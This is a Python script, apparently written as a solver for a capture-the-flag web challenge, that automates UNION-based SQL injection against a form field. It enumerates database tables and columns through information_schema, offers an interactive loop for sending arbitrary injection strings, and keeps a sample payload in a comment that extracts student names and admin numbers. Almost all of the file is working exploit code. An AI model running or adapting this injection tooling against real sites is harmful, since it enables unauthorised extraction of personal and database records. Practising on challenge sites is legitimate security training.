import requests as r
import json
url = 'https://r0.nzcsc.org.nz/challenge7/'

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Host": "r0.nzcsc.org.nz",
    "Origin": "https://r0.nzcsc.org.nz",
    "Referer": "https://r0.nzcsc.org.nz/challenge7/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
}


def print_res(command):
    resp = r.post(url, data=get_data(command), headers=headers)
    text = resp.text  # type: str
    table = text[text.index("<table>") + 7: text.index("</table>")]
    table = table.replace('<tr class="headtitle">', "")
    table = table.replace("</td><td>", " ").replace("<td>", "").replace("</td>", "").replace("</tr>", "")
    print("--------start--------")
    for row in table.split("<tr>"):
        print(row)
    print("--------done---------")


def get_res(name, table, where = None):
    if where is not None:
        whereq =  f' WHERE {where}'
    else:
        whereq = ''
    q = f'fakename\' UNION ALL SELECT 1,2,3,4,{name} from {table}{whereq};-- '
    print(q)
    resp = r.post(url, data=get_data(q), headers=headers)
    text = resp.text  # type: str
    table = text[text.index("<table>") + 7: text.index("</table>")]
    table = table.replace('<tr class="headtitle">', "")
    table = table.replace("</td><td>", " ").replace("<td>", "").replace("</td>", "").replace("</tr>", "")
    data = []
    for row in table.split("<tr>")[1:]:
        data.append(row.split(' ')[3])
    return data

# andrew' UNION ALL SELECT 1, id, surname, admin_no, school from tsebehtsiworc; --
def main3():
    while 1:
        try:
            print_res(input('Enter search:   '))
        except Exception as e:
            print(e)


def main():
    print('getting tables')
    tables = get_res('table_name', 'information_schema.tables')
    print(tables)
    table_cols = {}
    for table_name in tables:
        try:
            cols = get_res('column_name', 'information_schema.columns', f'table_name="{table_name}"')
            table_cols[table_name] = cols
        except:
            pass
    print(table_cols)


def get_data(fname):
    return f'firstn={fname}&subit=Check'


if __name__ == '__main__':
    main()
